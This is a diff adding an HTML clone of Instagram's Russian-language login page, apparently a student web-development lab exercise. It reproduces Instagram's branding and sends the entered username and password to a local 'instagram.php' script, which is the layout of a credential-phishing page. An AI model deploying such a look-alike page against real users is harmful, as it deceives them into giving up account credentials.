@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram login</title>
+    <style>
+        .global {
+            display: flex;
+            height: 100%;
+            font-family: BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            color: black;
+            flex-direction: column;
+        }
+        .img-fluid {
+            width: 174px;
+            height: auto;
+            margin-top: 36px;
+            margin-bottom: 12px;
+        }
+        .column {
+            width: 350px;
+            height: fit-content;
+            text-align: center;
+            box-sizing: border-box;
+        }
+        input[type="text"], input[type="password"] {
+            width: 80%;
+            padding: 9px 0px 7px 8px;
+            margin: 8px 0;
+            display: inline-block;
+            border: 1px solid #ccc;
+            box-sizing: border-box;
+            font-size: 12px;
+        }
+        input[type="submit"] {
+            width: 80%;
+            background-color: #3897f0;
+            color: white;
+            padding: 8px 20px;
+            margin: 8px 0;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 8px;
+        }
+        .or {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 10px;
+            color: #737373;
+        }
+        .or-line {
+            width: 35%;
+            height: 1px;
+            background-color: #DBDBDB;
+        }
+        #facebook_login {
+            margin: 40px auto;
+            color: #385185;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: bold;
+        }
+        #forgot_password {
+            padding-bottom: 10px;
+            color: #00376B;
+            text-decoration: none;
+            font-size: 12px;
+        }
+        .links-group {
+            margin-bottom: 10px;
+            text-align: center;
+        }
+        .block {
+            align-items: center;
+            background-color: rgb(255, 255, 255);
+            border: 1px solid rgb(219, 219, 219);
+            border-radius: 1px;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            flex-shrink: 0;
+            font: inherit;
+            font-size: 100%;
+            margin: 0 0 10px;
+            padding: 10px 0;
+            vertical-align: baseline;
+            font-size: 14px;
+        }
+        form {
+            width: 100%;
+        }
+        #phones {
+            width: 454px;
+        }
+        .items {
+            display: flex;
+            flex-direction: row;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            margin-top: 70px;
+        }
+        footer {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            text-decoration: none;
+            color: #737373;
+            font-size: 12px;
+        }
+        #options {
+            display: flex;
+            flex-direction: row;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
+            list-style-type: none;
+            padding: 0;
+        }
+        li a{
+            margin: 0 8px 12px 8px;
+            text-decoration: none;
+        }
+        li a:hover {
+            cursor: pointer;
+        }
+        li a:visited {
+            color: #737373;
+        }
+        #screenshot1 {
+            width: 244px;
+            position: absolute;
+            margin-left: -255px;
+            margin-top: -40px;
+        }
+    </style>
+</head>
+<body>
+    <div class="global">
+        <div class="items">
+            <img src="C:\Users\k_mir\OneDrive\Рабочий стол\Web Dev\Lab2\assets\home-phones-2x.png" alt="Phones" id="phones">
+            <img src="..\assets\screenshot1-2x.png" alt="Screenshot" id="screenshot1">
+            <div class="column">
+                <div class="block">
+                    <img src="C:\Users\k_mir\OneDrive\Рабочий стол\Web Dev\Lab2\assets\instagram-text-icon.svg" alt="Instagram" class="img-fluid">
+                    <form action="instagram.php" method="post">
+                        <div class="form-group">
+                            <input type="text" name="username" id="username" class="form-control" required placeholder="Телефон, имя пользователя или эл. адрес">
+                        </div>
+                        <div class="form-group">
+                            <input type="password" name="password" id="password" class="form-control" required placeholder="Пароль">
+                        </div>
+                        <input type="submit" value="Войти" class="btn btn-primary">
+                        <div class="or">
+                            <div class="or-line"></div>
+                            <span style="margin-left: 10px; margin-right: 10px; font-weight: 550;">ИЛИ</span>
+                            <div class="or-line"></div>
+                        </div>
+                        <div class="links-group">
+                            <div style="margin: 20px auto">
+                            <a href="https://www.facebook.com/" id="facebook_login">Войти через Facebook</a>
+                            </div>
+                            <div style="margin-bottom: 20px;">
+                                <a href="https://www.facebook.com/" id="forgot_password">Забыли пароль?</a>
+                            </div>
+                        </div>
+                    </form>
+                </div>
+                <div class="block">
+                    <p>У вас нет аккаунта? <a href="https://www.facebook.com/" style="color: #0095F6; font-weight: 600;">Зарегистрироваться</a></p>
+                </div>
+                <div>
+                    <p>Установите приложение.</p>
+                    <div style="display: flex; justify-content: center;">
+                        <a href="#" style="margin-right: 10px; margin-top: -47.8px;"><img src="C:\Users\k_mir\OneDrive\Рабочий стол\Web Dev\Lab2\assets\download-on-the-app-store-apple-logo-svgrepo-com.svg" alt="App Store" style="width: 136px;"></a>
+                        <a href="#"><img src="C:\Users\k_mir\OneDrive\Рабочий стол\Web Dev\Lab2\assets\Google_Play_Store_badge_EN.svg" alt="Google Play" style="width: 136px;"></a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <footer>
+            <ul id="options">
+                <li><a href="">Meta</a></li>
+                <li><a href="">Информация</a></li>
+                <li><a href="">Блог</a></li>
+                <li><a href="">Вакансии</a></li>
+                <li><a href="">Помощь</a></li>
+                <li><a href="">API</a></li>
+                <li><a href="">Конфиденциальность</a></li>
+                <li><a href="">Условия</a></li>
+                <li><a href="">Места</a></li>
+                <li><a href="">Instagram Lite</a></li>
+                <li><a href="">Threads</a></li>
+                <li><a href="">Загрузка контактови лица, не являющиеся пользователями</a></li>
+                <li><a href="">Meta Verified</a></li>
+            </ul>
+            <span>© 2024 Instagram from Meta</span>
+        </footer>
+    </div>
+</body>
+</html>
